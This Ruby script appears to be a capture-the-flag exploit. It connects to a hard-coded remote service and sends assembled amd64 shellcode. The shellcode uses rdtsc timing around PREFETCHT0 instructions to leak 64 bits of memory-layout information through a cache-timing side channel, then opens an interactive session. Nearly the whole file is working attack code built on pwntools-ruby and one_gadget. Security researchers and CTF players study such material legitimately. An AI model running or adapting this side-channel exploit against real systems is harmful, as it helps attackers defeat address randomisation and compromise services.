#!/usr/bin/env ruby
# encoding: ascii-8bit
require_relative '../../zocket/zocket'
require 'pry'
require 'pwn'      # https://github.com/peter50216/pwntools-ruby
require 'heapinfo' # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')

host, port = '202.120.7.198', 13579
@local = false
(host = '127.0.0.1'; @local = true) if ARGV.empty?
$z = Zocket.new host, port, logger: HeapInfo::Nil.new #HexLogger.new
def z;$z;end
#================= Exploit Start ====================

context.arch='amd64'
code = asm(<<-EOS
jmp solve
calc:
    mov esi, 200000
    rdtsc
    mov ecx, eax
    loop:
        test esi, esi
        je done
        PREFETCHT0 [rdi]
        dec esi
        jmp loop
    done:
        rdtsc
        sub eax, ecx
        ret

bit:
    mov r8, rdi
    mov r15, rdi
    mov rbx, 0x200000000
    add r8, r8
    mov rdi, r8
    shl rdi, 12
    add rdi, rbx
    call calc
    mov r9, rax
    inc r8
    mov rdi, r8
    shl rdi, 12
    add rdi, rbx
    call calc
    mov r10, rax
    cmp r9d, r10d
    jbe zero
    mov rax, 1
    jmp yo
zero:
    mov rax, 0
yo:
    mov rbx, 0x300000000
    add rbx, r15
    mov byte ptr [rbx], al
    ret
solve:
    mov r14, 64
bk:
    test r14, r14
    je fin
    mov rdi, r14
    call bit
    dec r14
    jmp bk
z:
    jmp z
fin:
    ret
EOS
)
z.write(p32(code.size))
z.write(code)

z.interact
